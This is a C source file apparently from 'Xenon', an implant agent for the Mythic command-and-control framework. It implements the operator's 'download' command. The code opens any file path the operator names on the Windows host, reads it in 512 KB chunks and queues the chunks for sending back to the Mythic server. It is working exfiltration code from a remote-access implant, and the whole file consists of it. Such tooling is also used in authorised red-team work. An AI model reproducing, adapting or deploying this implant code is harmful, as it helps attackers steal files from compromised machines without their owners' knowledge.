#include "Tasks/Download.h"

#include <windows.h>
#include "Xenon.h"
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_DOWNLOAD

#define CHUNK_SIZE  512000      // 512 KB

/**
 * @brief Initialize a file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] File FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD DownloadInit(_In_ PCHAR taskUuid, _Inout_ PFILE_DOWNLOAD File)
{
    DWORD Status = 0;

    if (!GetFileSizeEx(File->hFile, &File->fileSize))
    {
        DWORD error = GetLastError();
        _err("Error getting file size of %s : ERROR CODE %d", File->filepath, error);
        Status = error;
        return Status;
    }

    SIZE_T tuid = 0;
    strncpy(File->TaskUuid, taskUuid, TASK_UUID_SIZE + 1);
    // Calculate total chunks (rounded up)
    File->totalChunks = (DWORD)((File->fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);
    File->Initialized = FALSE;

    // Prepare package
    PPackage data = PackageInit(NULL, FALSE);
    PackageAddByte(data, DOWNLOAD_INIT);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt32(data, File->totalChunks);
    PackageAddString(data, File->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);

    PackageQueue(data);

    // Send package
    // PARSER Response = { 0 };
    // PackageSend(data, &Response);
    
//     BYTE status = ParserGetByte(&Response);
//     if (status == FALSE)
//     {
//         _err("DownloadInit returned failure status : 0x%hhx", status);
//         Status = ERROR_MYTHIC_DOWNLOAD;
//         goto end;
//     }

//     SIZE_T lenUuid  = TASK_UUID_SIZE;
//     PCHAR uuid = ParserGetString(&Response, &lenUuid);
//     if (uuid == NULL) 
//     {
//         _err("Failed to get UUID from response.");
//         Status = ERROR_MYTHIC_DOWNLOAD;
//         goto end;
//     }

//     _dbg("Download Inititialized for %s with UUID %s", download->filepath, uuid);

//     strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
//     download->fileUuid[TASK_UUID_SIZE + 1] = '\0';    // null-termination

// end:
//     // Cleanup
//     if (data) PackageDestroy(data);
//     if (&Response) ParserDestroy(&Response);

    return Status;
}

/* Update Mythic File UUID for Download Task */
BOOL DownloadUpdateFileUuid(PCHAR TaskUuid, PCHAR FileUuid)
{

    PFILE_DOWNLOAD List = xenonConfig->DownloadQueue;

    if (!TaskUuid || !FileUuid) {
        return FALSE;
    }

    /* Find Task This Belongs To */
    while (List)
    {
        if (strcmp(List->TaskUuid, TaskUuid) == 0)
        {
            /* Update file UUID */
            strncpy(List->fileUuid, FileUuid, sizeof(List->fileUuid));            
            _dbg("Set Download File Mythic ID: %s", List->fileUuid);

            List->Initialized = TRUE;

            return TRUE;
        }

        List = List->Next;
    }

    return FALSE;
}

/**
 * @brief Add instance of FILE_DOWNLOAD to global tracker
 */
VOID DownloadQueue(_In_ FILE_DOWNLOAD* File)
{
    _dbg("Adding file to download queue...");
    
    PFILE_DOWNLOAD List = NULL;

    if ( !File ) {
        return;
    }
    
    /* If there are no queued files, this is the first */
    if ( !xenonConfig->DownloadQueue )
    {
        xenonConfig->DownloadQueue  = File;
    }
    else
    {
        /* Add to the end of linked-list */
        List = xenonConfig->DownloadQueue;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next  = File;
    }
    
    return TRUE;
}

/**
 * @brief Send b64 chunks of a file to Mythic server
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
// DWORD DownloadContinue(_In_ PCHAR taskUuid, _Inout_ FILE_DOWNLOAD* download)
// {
//     DWORD Status = 0;
//     char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

//     if (!chunkBuffer)
//     {
//         DWORD error = GetLastError();
//         _err("Memory allocation failed. ERROR CODE: %d", error);
//         goto cleanup;
//     }

//     _dbg("Downloading Mythic File as UUID : %s", download->fileUuid);

//     download->currentChunk = 1;

//     while (download->currentChunk <= download->totalChunks)
//     {
//         DWORD bytesRead = 0;
//         if (!ReadFile(download->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL))
//         {
//             DWORD error = GetLastError();
//             _err("Error reading file: ERROR CODE: %d", error);
//             Status = error;
//             goto cleanup;
//         }

//         _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);

//         // Prepare package
//         PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
//         PackageAddString(cur, taskUuid, FALSE);
//         PackageAddInt32(cur, download->currentChunk);
//         PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
//         PackageAddBytes(cur, chunkBuffer, bytesRead, TRUE);
//         PackageAddInt32(cur, bytesRead);

//         // Send chunk
//         PARSER Response = { 0 };
//         PackageSend(cur, &Response);

//         BYTE success = ParserGetByte(&Response);
//         if (success == FALSE)
//         {
//             _err("Download chunk %d failed.", download->currentChunk);
//             Status = ERROR_MYTHIC_DOWNLOAD;
//             PackageDestroy(cur);
//             ParserDestroy(&Response);
//             goto cleanup;
//         }

//         download->currentChunk++;

//         PackageDestroy(cur);
//         ParserDestroy(&Response);
//     }

// cleanup:
//     if (chunkBuffer) LocalFree(chunkBuffer);

//     return Status;
// }



/**
 * @brief Queue file chunks to sender
 * 
 * @param[inout] File FILE_DOWNLOAD file instance
 * @return BOOL
 */
BOOL DownloadQueueChunks(_Inout_ PFILE_DOWNLOAD File)
{
    BOOL     Success     = FALSE;
    DWORD    NumOfChunks = 0;

    char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

    if (!chunkBuffer)
    {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        goto CLEANUP;
    }

    _dbg("Downloading Mythic File as UUID : %s", File->fileUuid);

    File->currentChunk = 1;

    while (File->currentChunk <= File->totalChunks)
    {
        DWORD bytesRead = 0;
        if (!ReadFile(File->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL))
        {
            DWORD error = GetLastError();
            _err("Error reading file: ERROR CODE: %d", error);
            goto CLEANUP;
        }


        if ( bytesRead == 0 ) {
            /* EOF Reached */
            goto CLEANUP;
        }
            

        _dbg("Adding chunk %d/%d (size: %d)", File->currentChunk, File->totalChunks, bytesRead);

        /* Add Chunk to Message Queue */
        PPackage Chunk = PackageInit(NULL, FALSE);

        PackageAddByte(Chunk, DOWNLOAD_CONTINUE);
        PackageAddString(Chunk, File->TaskUuid, FALSE);
        PackageAddInt32(Chunk, File->currentChunk);
        PackageAddBytes(Chunk, File->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddBytes(Chunk, chunkBuffer, bytesRead, TRUE);
        PackageAddInt32(Chunk, bytesRead);
        // Send chunk
        // PARSER Response = { 0 };
        // PackageSend(Chunk, &Response);
        PackageQueue(Chunk);

        // BYTE success = ParserGetByte(&Response);
        // if (success == FALSE)
        // {
        //     _err("Download chunk %d failed.", Download->currentChunk);
        //     Status = ERROR_MYTHIC_DOWNLOAD;
        //     PackageDestroy(cur);
        //     ParserDestroy(&Response);
        //     goto CLEANUP;
        // }

        NumOfChunks++;
        File->currentChunk++;

        // PackageDestroy(Chunk);
        // ParserDestroy(&Response);
    }


    PackageComplete(File->TaskUuid, NULL);

    Success = TRUE;

CLEANUP:
    if (chunkBuffer) LocalFree(chunkBuffer);

    return Success;
}

/**
 * @brief Add any chunks for file downloads to packet
 */
VOID DownloadPush()
{
    PFILE_DOWNLOAD Current = xenonConfig->DownloadQueue;
    PFILE_DOWNLOAD Prev    = NULL;

    while (Current)
    {

        PFILE_DOWNLOAD Next = Current->Next;

        if ( !Current->Initialized )
        {
            Prev = Current;
            Current = Next;
            continue;
        }

        if ( DownloadQueueChunks(Current) )
        {
            _dbg("Destroying Download from Queue File ID: [%s]", Current->fileUuid);

            /* Unlink */
            if ( Prev )
                Prev->Next = Next;
            else
                xenonConfig->DownloadQueue = Next;

            DownloadFree(Current);
            Current = Next;
            continue;
        }

        Prev = Current;
        Current = Next;

    }
}


/**
 * @brief Main command function for downloading a file from agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{    
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T pathLen      = 0;
    DWORD status        = 0;
    PFILE_DOWNLOAD File = NULL;
    PCHAR FilePath      = NULL;

    // FILE_DOWNLOAD fd    = { 0 };

    File = (PFILE_DOWNLOAD)LocalAlloc(LPTR, sizeof(FILE_DOWNLOAD));         // Must Free

    if ( File == NULL )
    {
        _err("Failed to allocate for file download");
        return;
    }

    FilePath = ParserGetString(arguments, &pathLen);

    File->hFile = CreateFileA(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (File->hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("Error opening file %s : ERROR CODE %d", FilePath, error);
        PackageError(taskUuid, error);
        goto end;
    }

    strncpy(File->filepath, FilePath, pathLen);

    // Prepare to send
    status = DownloadInit(taskUuid, File);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    // _dbg("Downloading FilePath:\"%s\" - ID:%s", File->filepath, File->fileUuid);


    /* Add Download Instance to Queue */
    DownloadQueue(File);

    // Transfer chunked file
    // status = DownloadContinue(taskUuid, &fd);
    // if ( status != 0 )
    // {
    //     PackageError(taskUuid, status);
    //     goto end;
    // }

    // PackageComplete(taskUuid, NULL);

end:

    return;
    // Cleanup
    // if (fd.hFile) CloseHandle(fd.hFile);
}

/**
 * @brief Thread entrypoint for Download function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI DownloadThread(_In_ LPVOID lpTaskParamter)
{
    _dbg("Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    Download(tp->TaskUuid, tp->TaskParser);
    
    _dbg("Download Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}

/**
 * @brief Free the download
 */
VOID DownloadFree(_In_ PFILE_DOWNLOAD File)
{
    if ( !File )
        return;

    if ( File->hFile ) 
    {
        CloseHandle(File->hFile);
        File->hFile = NULL;
    }

    LocalFree(File);
    File = NULL;
}


#endif  //INCLUDE_CMD_DOWNLOAD